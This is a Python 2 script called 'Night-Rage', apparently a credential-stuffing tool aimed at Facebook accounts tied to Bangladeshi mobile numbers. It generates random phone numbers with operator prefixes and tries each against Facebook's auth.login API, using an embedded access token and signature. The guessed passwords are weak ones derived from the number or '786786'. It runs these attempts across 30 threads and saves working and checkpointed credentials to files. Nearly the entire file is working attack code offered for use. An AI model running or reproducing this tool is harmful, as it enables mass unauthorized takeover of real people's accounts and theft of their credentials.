#!/usr/bin/python2
# coding=utf-8


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')
os.system('clear')
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
psb('\033[1;32mAll Packages Are Loading.........................')
for n in range(99999):
    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent',
                  'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def exb():
    print
    '[!] Exit'
    os.sys.exit()
def t():
    time.sleep(1)


def cb():
    os.system('clear')


##### LOGO #####
def logo():
    print u"\u001b[38;5;160m"+ "                      .~#########%%;~. "
    print u"\u001b[38;5;160m"+ "                     @############%%;`@"
    print u"\u001b[38;5;160m"+ "                    @######/~\/~\%%;,;,@"
    print u"\u001b[38;5;160m"+ "                   |#######\    /;;;;.,.|"
    print u"\u001b[38;5;161m"+ "                   |#########\/%;;;;;.,.|"
    print u"\u001b[38;5;161m"+ "          XX       |##/~~\####%;;;/~~\;,|       XX"
    print u"\u001b[38;5;161m"+ "        XX..X      |#|  o  \##%;/  o  |.|      X..XX"
    print u"\u001b[38;5;161m"+ "      XX.....X     |##\____/##%;\____/.,|     X.....XX"
    print u"\u001b[38;5;162m"+ " XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX"
    print u"\u001b[38;5;162m"+ "X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X"
    print u"\u001b[38;5;162m"+ "X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X"
    print u"\u001b[38;5;162m"+ "X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X"
    print u"\u001b[38;5;163m"+ " X# \.X        @#%,.@    Night-Rage    @#%,.@        X./  #"
    print u"\u001b[38;5;163m"+ "  ##  X          @#%,.@              @#%,.@          X   #"
    print u"\u001b[38;5;163m"+ ",  XX#X            @% .@           @X%. @            X XX"
    print u"\u001b[38;5;163m"+ "   `###X             @#%,.@      @#%,.@             ####'"
    print u"\u001b[38;5;164m"+ "  . ' ###              @#%.,@  @#%,.@              ###`"
    print u"\u001b[38;5;164m"+ "    . ;##                 @#%.@#%,.@               ##;` ' ."
    print u"\u001b[38;5;164m"+ "      ' #                  @#%,.@                  # ,"
    print u"\u001b[38;5;164m"+ "      ` |                @#%,.@  @@                | "
    print u"\u001b[38;5;165m"+ "        '                 @@@  @@@                 '"
    print u"\u001b[38;5;40m" + " Darknethaxor \033[1;96mNIGHT-RAGE"
    print u"\u001b[38;5;208m"+ 55*"-"
    print u"\u001b[38;5;220m"+ "AUTHOR     : DARKNET HAXOR"
    print u"\u001b[38;5;221m"+ "FACEBOOK   : FACEBOOK.COM/DARKNETHAXOR"
    print u"\u001b[38;5;222m"+ "YOUTUBE    : YOUTUBE.COM/DARKNETHAXOR"
    print u"\u001b[38;5;223m"+ "GITHUB     : FACEBOOK.COM/farhan.bot2106"
    print u"\u001b[38;5;208m"+ 55*"-"
def logger():
    os.system('clear')
    print logo()
    print u"\u001b[38;5;40m"
    CorrectUsername = "darknethaxor"
    CorrectPassword = "nightrage"
    loop = 'true'
    while (loop == 'true'):
        username = raw_input('USERNAME: ')
        if (username == CorrectUsername):
            password = raw_input('PASSWORD: ')
            if (password == CorrectPassword):
                print("\nAPPROVED!")
                time.sleep(1)
                loop = 'false'
            else:
                print("wrong password")
                os.system('xdg-open https://www.facebook.com/groups/1546183828897889')
                os.system('clear')
                print logo()
        else:
            print("wrong username")
            os.system('xdg-open https://www.facebook.com/groups/1546183828897889')
            os.system('clear')
            print logo()
    os.system('clear')


back = 0
successful = []
cpb = []
oks = []
id = []
logger()
logo3='''
\033[1;92m
______                   _           _           _     
| ___ \                 | |         | |         | |    
| |_/ / __ _ _ __   __ _| | __ _  __| | ___  ___| |__  
| ___ \/ _` | '_ \ /\033[31;1m _` | |/ _` |/ _`\033[1;92m |/ _ \/ __| '_ \ 
| |_/ / (_| | | | | \033[31;1m(_| | | (_| | (_|\033[1;92m |  __/\__ \ | | |
\____/ \__,_|_| |_|\__, |_|\__,_|\__,_|\___||___/_| |_|
                    __/ |                              
                   |___/                               
    '''
print(logo3)
print u"\u001b[38;5;208m"+ 55*"-"
choser = '''
\033[1;95m  Select Your Option:
\033[1;92m  [1] 6-Digit
\033[1;93m  [2] 7-Digit
\033[1;96m  [3] 8-Digit
\033[1;95m  [4] 11-Digit
'''
print(choser)
print u"\u001b[38;5;208m"+ 55*"-"
chose=raw_input("Chose Your Code: ")
def menu():
    os.system('clear')
    print logo()
    print("ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE")
    print("[1]  \033[1;96mGP")
    print("[2]  \033[1;92mRobi")
    print("[3]  \033[1;96mAirtel")
    print("[4]  \033[1;92mBanglalink")
    print("[5]  \033[1;93mTeletalk")
    print('[0]  \033[1;95mExit            ')
    print(50 * '-')
    action()


def action():
    bch = raw_input('\n  ===>   ')
    if bch == '':
        print
        '[!] Fill in correctly'
        action()
    elif bch == "1":
        os.system("clear")
        print logo()
        print("170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139")
        try:
            c = raw_input(" choose code  : ")
            k = "+880"
            idlist = ('.txt')
            for line in open(idlist, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif bch == "2":
        os.system("clear")
        print logo()
        print("180,181, 182, 183, 184, 185, 186, 187, 188, 189")
        try:
            c = raw_input(" choose code  : ")
            k = "+880"
            idlist = ('.txt')
            for line in open(idlist, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif bch == "3":
        os.system("clear")
        print logo()
        print("160,161, 162, 163, 164, 165, 166, 167, 168, 169")
        try:
            c = raw_input(" choose code  : ")
            k = "+880"
            idlist = ('.txt')
            for line in open(idlist, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif bch == "4":
        os.system("clear")
        print logo()
        print("190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149")
        try:
            c = raw_input(" choose code  : ")
            k = "+880"
            idlist = ('.txt')
            for line in open(idlist, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif bch == "5":
        os.system("clear")
        print logo()
        print("150,151, 152, 153, 154, 155, 156, 157, 158, 159")
        try:
            c = raw_input(" choose code  : ")
            k = "+880"
            idlist = ('.txt')
            for line in open(idlist, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif bch == '0':
        exb()
    else:
        print
        '[!] Fill in correctly'
        action()

    xxx = str(len(id))
    psb('[✓] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[✓] Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    psb(50*'-')
    time.sleep(0.5)
    print
    50 * '-'
    print

    def main(arg):
        global cpb, oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            if chose=='1':
                digi6 = user[1:7]
                pass1 = digi6
                data = br.open(
                    'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass1 + '\n')
                    okb.close()
                    oks.append(c + user + pass1)
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print(
                                    '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass1 + '\n')
                        cps.close()
                        cpb.append(c + user + pass1)
                    else:
                        digi6 = user[1:7]
                        pass1 = '786786'
                        data = br.open(
                            'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass1 + '\n')
                            okb.close()
                            oks.append(c + user + pass1)
                        else:
                            if 'www.facebook.com' in q['error_msg']:
                                print(
                                        '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                                cps = open('save/checkpoint.txt', 'a')
                                cps.write(k + c + user + '|' + pass1 + '\n')
                                cps.close()
                                cpb.append(c + user + pass1)
            elif chose=='2':
                pass1 = user
                data = br.open(
                    'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass1 + '\n')
                    okb.close()
                    oks.append(c + user + pass1)
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print(
                                    '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass1 + '\n')
                        cps.close()
                        cpb.append(c + user + pass1)
                    else:
                        digi6 = user
                        pass1 = '786786'
                        data = br.open(
                            'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass1 + '\n')
                            okb.close()
                            oks.append(c + user + pass1)
                        else:
                            if 'www.facebook.com' in q['error_msg']:
                                print(
                                        '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                                cps = open('save/checkpoint.txt', 'a')
                                cps.write(k + c + user + '|' + pass1 + '\n')
                                cps.close()
                                cpb.append(c + user + pass1)
            elif chose=='3':
                result = k + c + user
                digi8 = result[6:14]
                pass1 = digi8
                data = br.open(
                    'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass1 + '\n')
                    okb.close()
                    oks.append(c + user + pass1)
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print(
                                    '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass1 + '\n')
                        cps.close()
                        cpb.append(c + user + pass1)
                    else:
                        result = k + c + user
                        digi8 = result[6:14]
                        pass1 = '786786'
                        data = br.open(
                            'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass1 + '\n')
                            okb.close()
                            oks.append(c + user + pass1)
                        else:
                            if 'www.facebook.com' in q['error_msg']:
                                print(
                                        '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                                cps = open('save/checkpoint.txt', 'a')
                                cps.write(k + c + user + '|' + pass1 + '\n')
                                cps.close()
                                cpb.append(c + user + pass1)
            elif chose=='4':
                result = "0" + c + user
                digi11 = result
                pass1 = digi11
                data = br.open(
                    'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass1 + '\n')
                    okb.close()
                    oks.append(c + user + pass1)
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print(
                                    '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass1 + '\n')
                        cps.close()
                        cpb.append(c + user + pass1)
                    else:
                        result = "0" + c + user
                        digi11 = result
                        pass1 = '786786'
                        data = br.open(
                            'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass1 + '\n')
                            okb.close()
                            oks.append(c + user + pass1)
                        else:
                            if 'www.facebook.com' in q['error_msg']:
                                print(
                                            '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
                                cps = open('save/checkpoint.txt', 'a')
                                cps.write(k + c + user + '|' + pass1 + '\n')
                                cps.close()
                                cpb.append(c + user + pass1)




        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    '[✓] Process Has Been Completed....'
    print
    '[✓] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print('[✓] CP File Has Been Saved : save/checkpoint.txt')
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .d.py')


if __name__ == '__main__':
    menu()
